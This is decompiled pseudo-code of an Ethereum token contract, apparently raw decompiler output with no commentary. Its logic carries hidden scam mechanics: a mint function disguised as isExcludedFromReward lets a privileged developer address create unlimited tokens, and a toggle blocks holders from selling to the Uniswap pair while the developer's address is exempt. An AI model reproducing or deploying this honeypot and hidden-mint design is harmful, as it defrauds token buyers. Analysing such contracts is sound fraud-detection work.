contract main {




// =====================  Runtime code  =====================


address owner;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
address stor3;
address stor4;
uint256 totalSupply;
uint8 stor6;
uint128 stor6; offset 168
address uniSwapV2Address; offset 8
array of uint256 name;
array of uint256 symbol;
uint8 decimals;
address BURN_ADDRESS;
uint256 stor12;

function name() payable {
    return name[0 len name.length]
}

function totalSupply() payable {
    return totalSupply
}

function decimals() payable {
    return decimals
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    return balanceOf[address(arg1)]
}

function owner() payable {
    return owner
}

function symbol() payable {
    return symbol[0 len symbol.length]
}

function uniSwapV2() payable {
    return uniSwapV2Address
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    return allowance[address(arg1)][address(arg2)]
}

function lock() payable {
    return bool(uint8(stor6.field_0))
}

function BURN_ADDRESS() payable {
    return BURN_ADDRESS
}

function _fallback() payable {
    revert
}

function renounceOwnership() payable {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    emit OwnershipTransferred(owner, 0);
    owner = 0
}

function approve(address arg1) payable {
    require calldata.size - 4 >= 32
    if stor3 != msg.sender:
        revert with 0, 'ERC20: cannot permit dev address'
    stor4 = arg1
}

function transferOwnership(address arg1) payable {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    38,
                    0x734f776e61626c653a206e6577206f776e657220697320746865207a65726f20616464726573,
                    mem[202 len 26]
    emit OwnershipTransferred(owner, arg1);
    owner = arg1
}

function uniSV2(bool arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    33,
                    0xfe45524332303a2063616e6e6f74207065726d6974207a65726f20616464726573,
                    mem[197 len 31]
    if stor3 != msg.sender:
        revert with 0, 'ERC20: cannot permit dev address'
    uint8(stor6.field_0) = uint8(arg1)
    uniSwapV2Address = arg2
    Mask(88, 0, stor6.field_168) = Mask(88, 168, arg1) >> 168
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function isExcludedFromReward(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    33,
                    0xfe45524332303a2063616e6e6f74207065726d6974207a65726f20616464726573,
                    mem[197 len 31]
    if stor3 != msg.sender:
        revert with 0, 'ERC20: cannot permit dev address'
    if arg1 + totalSupply < totalSupply:
        revert with 0, 'SafeMath: addition overflow'
    totalSupply += arg1
    if arg1 + balanceOf[address(msg.sender)] < balanceOf[address(msg.sender)]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(msg.sender)] += arg1
    emit 0x65ddf252: arg1, 0, msg.sender
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0x7342455032303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[201 len 27]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0xef42455032303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[199 len 29]
    if not uint8(stor6.field_0):
        if uniSwapV2Address == arg1:
            if stor3 != msg.sender:
                if arg2 > 1:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                40,
                                0x735472616e7366657220616d6f756e74206578636565647320746865206d61785478416d6f756e74,
                                mem[204 len 24]
    if msg.sender == owner:
        if arg2 > balanceOf[address(msg.sender)]:
            revert with 0, 
                        32,
                        38,
                        0x6542455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                        mem[166 len 26],
                        mem[218 len 6]
        balanceOf[address(msg.sender)] -= arg2
        if arg2 + balanceOf[arg1] < balanceOf[arg1]:
            revert with 0, 'SafeMath: addition overflow'
        balanceOf[address(arg1)] = arg2 + balanceOf[arg1]
        emit 0x65ddf252: arg2, msg.sender, arg1
    else:
        if stor4 != msg.sender:
            if not arg1:
                if arg2 >= stor12:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                40,
                                0x735472616e7366657220616d6f756e74206578636565647320746865206d61785478416d6f756e74,
                                mem[204 len 24]
        if not arg2:
            if 0 > arg2:
                revert with 0, 'SafeMath: subtraction overflow'
            if arg2 > balanceOf[address(msg.sender)]:
                revert with 0, 
                            32,
                            38,
                            0x6542455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                            mem[294 len 26],
                            mem[346 len 6]
            balanceOf[address(msg.sender)] -= arg2
            if balanceOf[stor11] < balanceOf[stor11]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[stor11] = balanceOf[stor11]
            if arg2 + balanceOf[arg1] < balanceOf[arg1]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg1)] = arg2 + balanceOf[arg1]
            emit 0x65ddf252: 0, msg.sender, BURN_ADDRESS
            emit 0x65ddf252: arg2, msg.sender, arg1
        else:
            if 5 * arg2 / arg2 != 5:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            33,
                            0x2e536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                            mem[197 len 31]
            if 5 * arg2 / 100 > arg2:
                revert with 0, 'SafeMath: subtraction overflow'
            if arg2 > balanceOf[address(msg.sender)]:
                revert with 0, 
                            32,
                            38,
                            0x6542455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                            mem[294 len 26],
                            mem[346 len 6]
            balanceOf[address(msg.sender)] -= arg2
            if (5 * arg2 / 100) + balanceOf[stor11] < balanceOf[stor11]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[stor11] += 5 * arg2 / 100
            if arg2 - (5 * arg2 / 100) + balanceOf[arg1] < balanceOf[arg1]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg1)] = arg2 - (5 * arg2 / 100) + balanceOf[arg1]
            emit 0x65ddf252: (5 * arg2 / 100), msg.sender, BURN_ADDRESS
            emit 0x65ddf252: (arg2 - (5 * arg2 / 100)), msg.sender, arg1
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0x7342455032303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[201 len 27]
    if not arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0xef42455032303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[199 len 29]
    if not uint8(stor6.field_0):
        if uniSwapV2Address == arg2:
            if stor3 != arg1:
                if arg3 > 1:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                40,
                                0x735472616e7366657220616d6f756e74206578636565647320746865206d61785478416d6f756e74,
                                mem[204 len 24]
    if arg1 == owner:
        if arg3 > balanceOf[address(arg1)]:
            revert with 0, 
                        32,
                        38,
                        0x6542455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                        mem[166 len 26],
                        mem[218 len 6]
        balanceOf[address(arg1)] -= arg3
        if arg3 + balanceOf[arg2] < balanceOf[arg2]:
            revert with 0, 'SafeMath: addition overflow'
        balanceOf[address(arg2)] = arg3 + balanceOf[arg2]
        emit 0x65ddf252: arg3, arg1, arg2
        if arg3 > allowance[address(arg1)][address(msg.sender)]:
            revert with 0, 
                        32,
                        40,
                        0x7745524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                        mem[264 len 24],
                        mem[312 len 8]
        if not arg1:
            revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[392 len 28]
        if not msg.sender:
            revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[390 len 30]
    else:
        if stor4 != arg1:
            if not arg2:
                if arg3 >= stor12:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                40,
                                0x735472616e7366657220616d6f756e74206578636565647320746865206d61785478416d6f756e74,
                                mem[204 len 24]
        if not arg3:
            if 0 > arg3:
                revert with 0, 'SafeMath: subtraction overflow'
            if arg3 > balanceOf[address(arg1)]:
                revert with 0, 
                            32,
                            38,
                            0x6542455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                            mem[294 len 26],
                            mem[346 len 6]
            balanceOf[address(arg1)] -= arg3
            if balanceOf[stor11] < balanceOf[stor11]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[stor11] = balanceOf[stor11]
            if arg3 + balanceOf[arg2] < balanceOf[arg2]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg2)] = arg3 + balanceOf[arg2]
            emit 0x65ddf252: 0, arg1, BURN_ADDRESS
            emit 0x65ddf252: arg3, arg1, arg2
        else:
            if 5 * arg3 / arg3 != 5:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            33,
                            0x2e536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                            mem[197 len 31]
            if 5 * arg3 / 100 > arg3:
                revert with 0, 'SafeMath: subtraction overflow'
            if arg3 > balanceOf[address(arg1)]:
                revert with 0, 
                            32,
                            38,
                            0x6542455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                            mem[294 len 26],
                            mem[346 len 6]
            balanceOf[address(arg1)] -= arg3
            if (5 * arg3 / 100) + balanceOf[stor11] < balanceOf[stor11]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[stor11] += 5 * arg3 / 100
            if arg3 - (5 * arg3 / 100) + balanceOf[arg2] < balanceOf[arg2]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg2)] = arg3 - (5 * arg3 / 100) + balanceOf[arg2]
            emit 0x65ddf252: (5 * arg3 / 100), arg1, BURN_ADDRESS
            emit 0x65ddf252: (arg3 - (5 * arg3 / 100)), arg1, arg2
        if arg3 > allowance[address(arg1)][address(msg.sender)]:
            revert with 0, 
                        32,
                        40,
                        0x7745524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                        mem[392 len 24],
                        mem[440 len 8]
        if not arg1:
            revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[520 len 28]
        if not msg.sender:
            revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[518 len 30]
    ('bool', 'msg.sender')
    allowance[address(arg1)][address(msg.sender)] -= arg3
    emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
    return 1
}



}
